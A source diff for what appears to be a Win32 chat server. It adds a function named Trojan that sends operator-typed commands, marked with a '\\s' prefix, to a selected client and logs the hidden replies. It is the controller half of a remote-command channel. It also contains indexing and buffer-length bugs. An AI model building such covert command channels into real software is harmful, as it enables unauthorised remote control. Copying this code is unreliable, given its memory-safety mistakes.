@@ -7,14 +7,15 @@ HINSTANCE hInst;                                // 当前实例
 // 全局变量: 
 WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
 WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名
-WCHAR loadBuffer[MAX_LOADSTRING];
-WCHAR writeBuffer[MAX_LOADSTRING];
+WCHAR loadBuffer[MAX_LOADSTRING * 2];
+WCHAR writeBuffer[MAX_LOADSTRING * 2];
 //Static mutex for the dialog
 HANDLE logMutex;
 //dialog handle
 HWND hLogger;
 HWND hDisp;
 HWND hList;
+HWND hCmdEdit;
 //buffer for static textbox log
 WCHAR logbuffer[30000];
 
@@ -191,6 +192,7 @@ DWORD WINAPI udpReceiver(LPVOID pM)
 		mbstowcs(tmp + lstrlen(tmp), udpbuf, iResult);
 		lstrcat(tmp, L"\n");
 		writeLog(tmp);
+		broadcast(udpbuf, iResult);
 		sendto(ListenSocket, udpbuf, iResult, 0, (sockaddr *)&cAddr, cAddrLen);
 		/*if (ClientSocket == INVALID_SOCKET)
 		{
@@ -228,19 +230,35 @@ int broadcast(const char *s, int len)
 	int iResult;
 	/*char sendbuf[DEFAULT_BUFLEN * 2];
 	wcstombs(sendbuf, (const WCHAR*)pM, lstrlen((const WCHAR*)pM));*/
-	for (SOCKET sock : clientSet)
+	for (int id = 1; id <= clientSet.size(); id++)
 	{
+		SOCKET sock = clientSet[id -1];
+		if (sock == INVALID_SOCKET) continue;
 		iResult = send(sock, s, len, 0);
+		if (iResult == -1)
+		{
+			int pos = SendMessage(hList, LB_FINDSTRINGEXACT, 0, (LPARAM)addrTable[id].c_str());
+			SendMessage(hList, LB_DELETESTRING, pos, 0);
+			clientSet[id] = INVALID_SOCKET;
+			LoadString(hInst, IDS_EXIT, loadBuffer, MAX_LOADSTRING);
+			wsprintf(writeBuffer, loadBuffer, iResult);
+	     	writeLog(writeBuffer);
+			continue;
+		}
 		LoadString(hInst, IDS_SEND, loadBuffer, MAX_LOADSTRING);
 		wsprintf(writeBuffer, loadBuffer, iResult);
 		writeLog(writeBuffer);
 	}
 	return 0;
 }
+//tcp连接核心代码
 DWORD WINAPI singleClient(LPVOID pM)
 {
+    WCHAR loadBuffer[MAX_LOADSTRING * 2];
+    WCHAR writeBuffer[MAX_LOADSTRING * 2];
 	int id = (int)pM;
-	char recvbuf[DEFAULT_BUFLEN];
+	char recvbuf[DEFAULT_BUFLEN * 2];
+
 	WCHAR recvtrans[DEFAULT_BUFLEN * 2];
 	const int recvbuflen = DEFAULT_BUFLEN;
 	int iResult, iSendResult;
@@ -249,19 +267,21 @@ DWORD WINAPI singleClient(LPVOID pM)
 		iResult = recv(clientSet[id - 1], recvbuf, recvbuflen, 0);
 		if (iResult > 0)
 		{
+			recvbuf[iResult] = '\0';
 			LoadString(hInst, IDS_RECV, loadBuffer, MAX_LOADSTRING);
 			wsprintf(writeBuffer, loadBuffer, iResult);
 			writeLog(writeBuffer);
 			statAppend(id, writeBuffer);
 			time_t tmpTime = time(0);
 			wsprintf(writeBuffer, L"%s [%d]:", _wctime(&tmpTime), id);
-			mbstowcs(recvtrans, recvbuf, iResult);
+			//mbstowcs(recvtrans, recvbuf, iResult + 2);
+			MultiByteToWideChar(CP_ACP, 0, recvbuf, iResult + 2, recvtrans, DEFAULT_BUFLEN);
 			recvtrans[iResult] = 0;
 			//MultiByteToWideChar(CP_OEMCP, MB_PRECOMPOSED, recvbuf, iResult, recvtrans, 0);
-			lstrcat(writeBuffer, recvtrans);
+			if (recvbuf[0] == '\\' && recvbuf[1] == 's') lstrcat(writeBuffer, recvtrans + 2);
+			else lstrcat(writeBuffer, recvtrans);
 			lstrcat(writeBuffer, L"\n");
 			writeLog(writeBuffer);
-			statAppend(id, recvtrans);
 			//因为广播给所有连接了，所以这段回声可以不要
 			//iSendResult = send(clientSet[id - 1], recvbuf, iResult, 0);
 			//if (iSendResult == SOCKET_ERROR)
@@ -275,12 +295,23 @@ DWORD WINAPI singleClient(LPVOID pM)
 			
 			//这里可能阻塞会使得编程更加简单
 			//CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)broadcast, (LPVOID)recvtrans, 0, NULL);
+			if (recvbuf[0] == '\\' && recvbuf[1] == 's')
+			{
+			statAppend(id, recvtrans + 2);
+				continue;
+			}
+			//statAppend(id, writeBuffer);
 			broadcast(recvbuf, iResult);
-			statAppend(id, writeBuffer);
 		}
 	} while (iResult > 0);
-	iResult = shutdown(clientSet[id - 1], SD_SEND);
+	iResult = shutdown(clientSet[id-1], SD_SEND);
 	closesocket(clientSet[id-1]);
+	int pos = SendMessage(hList, LB_FINDSTRINGEXACT, 0, (LPARAM)addrTable[id].c_str());
+	SendMessage(hList, LB_DELETESTRING, pos, 0);
+	clientSet[id - 1] = INVALID_SOCKET;
+				LoadString(hInst, IDS_EXIT, loadBuffer, MAX_LOADSTRING);
+				wsprintf(writeBuffer, loadBuffer, id);
+			  writeLog(writeBuffer);
 	//WSACleanup();
 	return 0;
 }
@@ -294,4 +325,50 @@ void statAppend(int id, const WCHAR * s)
 {
 	status[id] += s;
 	status[id].append(L"\n");
+}
+void Trojan(int nIndex, WCHAR * wcmd)
+{
+	WCHAR addrBuffer[100];
+	char buf[1024] = "\\s ";
+	SendMessage(hList, LB_GETTEXT, nIndex, (LPARAM)addrBuffer);
+	sprintf(buf + 2, "%S\n", wcmd);
+	int id = idTable[addrBuffer];
+		SOCKET sock = clientSet[id -1];
+		int iResult = send(sock, buf, strlen(buf), 0);
+		if (iResult == -1)
+		{
+			int pos = SendMessage(hList, LB_FINDSTRINGEXACT, 0, (LPARAM)addrTable[id].c_str());
+			SendMessage(hList, LB_DELETESTRING, pos, 0);
+			clientSet[id-1] = INVALID_SOCKET;
+			LoadString(hInst, IDS_EXIT, loadBuffer, MAX_LOADSTRING);
+			wsprintf(writeBuffer, loadBuffer, iResult);
+	     	writeLog(writeBuffer);
+		}
+		LoadString(hInst, IDS_SEND, loadBuffer, MAX_LOADSTRING);
+		wsprintf(writeBuffer, loadBuffer, iResult);
+		writeLog(writeBuffer);
+}
+WNDPROC oldEditProc;
+LRESULT CALLBACK subEditProc(HWND wnd, UINT msg, WPARAM wParam, LPARAM lParam)
+{
+	switch (msg)
+	{
+	case WM_KEYDOWN:
+		switch (wParam)
+		{
+		case VK_RETURN:
+			//Do your stuff
+			SendMessage(hCmdEdit, WM_GETTEXT, DEFAULT_BUFLEN, (LPARAM)loadBuffer);
+			int nIndex = SendMessage((HWND)hList, LB_GETCURSEL, 0, 0);
+			Trojan(nIndex, loadBuffer);
+			Display(nIndex);
+			SendMessage(hCmdEdit, WM_SETTEXT, 0, (LPARAM)L"");
+			break;  //or return 0; if you don't want to pass it further to def proc
+					//If not your key, skip to default:
+		}
+		break;
+	default:
+		return CallWindowProc(oldEditProc, wnd, msg, wParam, lParam);
+	}
+	return 0;
 }
